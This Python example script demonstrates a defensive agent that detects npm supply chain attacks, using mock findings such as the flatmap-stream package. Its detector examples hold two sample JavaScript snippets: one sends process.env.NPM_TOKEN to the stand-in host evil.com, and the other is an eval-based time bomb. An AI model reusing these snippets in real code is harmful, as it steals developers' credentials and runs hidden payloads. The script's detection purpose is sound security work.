"""
Example usage of the Supply Chain Attack Detection Agent.

This script demonstrates how to use the SupplyChainAttackAgent to detect
sophisticated supply chain attacks like Hulud, event-stream, and similar compromises.
"""

import os
from dotenv import load_dotenv

from agents.supply_chain_agent import SupplyChainAttackAgent
from agents.types import SharedContext, Finding, AgentResult

# Load environment variables
load_dotenv()


def example_basic_usage():
    """Example: Basic supply chain attack detection."""
    print("=" * 80)
    print("Example 1: Basic Supply Chain Attack Detection")
    print("=" * 80)
    
    # Create agent
    agent = SupplyChainAttackAgent()
    
    # Create mock context with high-risk package
    context = SharedContext(
        initial_findings=[
            Finding(
                package_name="flatmap-stream",
                package_version="0.1.1",
                finding_type="malicious_package",
                severity="critical",
                description="Known malicious package",
                confidence=0.95,
                evidence={"reason": "Known malicious package"},
                detection_method="rule_based"
            )
        ],
        dependency_graph={},
        packages=["flatmap-stream"],
        ecosystem="npm",
        agent_results={}
    )
    
    # Analyze for supply chain attacks
    result = agent.analyze(context, timeout=30)
    
    print(f"\nAnalysis Results:")
    print(f"  Packages Analyzed: {result['total_packages_analyzed']}")
    print(f"  Attacks Detected: {result['supply_chain_attacks_detected']}")
    print(f"  Confidence: {result['confidence']:.2f}")
    print(f"  Duration: {result['duration_seconds']:.2f}s")
    
    # Print package details
    for pkg in result['packages']:
        print(f"\nPackage: {pkg['package_name']}@{pkg['package_version']}")
        print(f"  Attack Likelihood: {pkg['attack_likelihood']}")
        print(f"  Confidence: {pkg['confidence']:.2f}")
        print(f"  Indicators: {len(pkg['supply_chain_indicators'])}")
        
        if pkg['attack_pattern_matches']:
            print(f"  Pattern Matches:")
            for match in pkg['attack_pattern_matches']:
                print(f"    - {match['pattern_name']} (similarity: {match['similarity']:.0%})")
        
        print(f"  Reasoning: {pkg['reasoning']}")


def example_with_reputation_context():
    """Example: Supply chain detection with reputation analysis context."""
    print("\n" + "=" * 80)
    print("Example 2: Supply Chain Detection with Reputation Context")
    print("=" * 80)
    
    # Create agent
    agent = SupplyChainAttackAgent()
    
    # Create context with reputation analysis results
    context = SharedContext(
        initial_findings=[],
        dependency_graph={},
        packages=["suspicious-package"],
        ecosystem="npm",
        agent_results={
            "reputation": AgentResult(
                agent_name="ReputationAnalysisAgent",
                success=True,
                data={
                    "packages": [
                        {
                            "package_name": "suspicious-package",
                            "package_version": "1.0.0",
                            "reputation_score": 0.25,
                            "risk_level": "high",
                            "risk_factors": [
                                {
                                    "type": "new_package",
                                    "severity": "high"
                                }
                            ]
                        }
                    ]
                },
                duration_seconds=2.5
            )
        }
    )
    
    # Analyze for supply chain attacks
    result = agent.analyze(context, timeout=30)
    
    print(f"\nAnalysis Results:")
    print(f"  Packages Analyzed: {result['total_packages_analyzed']}")
    print(f"  Attacks Detected: {result['supply_chain_attacks_detected']}")
    
    for pkg in result['packages']:
        print(f"\nPackage: {pkg['package_name']}")
        print(f"  Attack Likelihood: {pkg['attack_likelihood']}")
        print(f"  Indicators Detected: {len(pkg['supply_chain_indicators'])}")
        
        if pkg['supply_chain_indicators']:
            print(f"  Indicators:")
            for ind in pkg['supply_chain_indicators'][:5]:
                print(f"    - {ind['type']}: {ind['description']}")


def example_tool_functions():
    """Example: Using individual tool functions."""
    print("\n" + "=" * 80)
    print("Example 3: Using Individual Tool Functions")
    print("=" * 80)
    
    # Create agent
    agent = SupplyChainAttackAgent()
    
    # Example 1: Analyze maintainer history
    print("\n1. Analyzing maintainer history for 'express'...")
    maintainer_indicators = agent.analyze_maintainer_history("express", "npm")
    print(f"   Found {len(maintainer_indicators)} maintainer indicators")
    
    # Example 2: Check publishing patterns
    print("\n2. Checking publishing patterns for 'lodash'...")
    publishing_indicators = agent.check_publishing_patterns("lodash", "npm")
    print(f"   Found {len(publishing_indicators)} publishing indicators")
    
    # Example 3: Detect exfiltration patterns in code
    print("\n3. Detecting exfiltration patterns in code...")
    suspicious_code = """
    const token = process.env.NPM_TOKEN;
    fetch('http://evil.com/collect', {
        method: 'POST',
        body: JSON.stringify({ token: token })
    });
    """
    exfiltration_indicators = agent.detect_exfiltration_patterns(suspicious_code)
    print(f"   Found {len(exfiltration_indicators)} exfiltration indicators")
    for ind in exfiltration_indicators:
        print(f"     - {ind['category']}: {ind['description']}")
    
    # Example 4: Detect delayed activation
    print("\n4. Detecting delayed activation patterns...")
    time_bomb_code = """
    setTimeout(() => {
        if (new Date() > new Date('2024-12-01')) {
            eval(maliciousCode);
        }
    }, 24 * 60 * 60 * 1000);
    """
    delayed_indicators = agent.detect_delayed_activation(time_bomb_code)
    print(f"   Found {len(delayed_indicators)} delayed activation indicators")
    for ind in delayed_indicators:
        print(f"     - {ind['category']}: {ind['description']}")
    
    # Example 5: Match attack patterns
    print("\n5. Matching against known attack patterns...")
    test_indicators = [
        {"type": "maintainer_change", "severity": "high"},
        {"type": "env_variable_access", "category": "env_variables"},
        {"type": "network_exfiltration", "category": "network_exfiltration"},
        {"type": "rapid_version_release", "severity": "high"}
    ]
    pattern_matches = agent.match_attack_patterns(test_indicators)
    print(f"   Found {len(pattern_matches)} pattern matches")
    for match in pattern_matches:
        print(f"     - {match['pattern_name']}: {match['similarity']:.0%} similarity")


if __name__ == "__main__":
    # Run examples
    example_basic_usage()
    example_with_reputation_context()
    example_tool_functions()
    
    print("\n" + "=" * 80)
    print("Examples completed!")
    print("=" * 80)
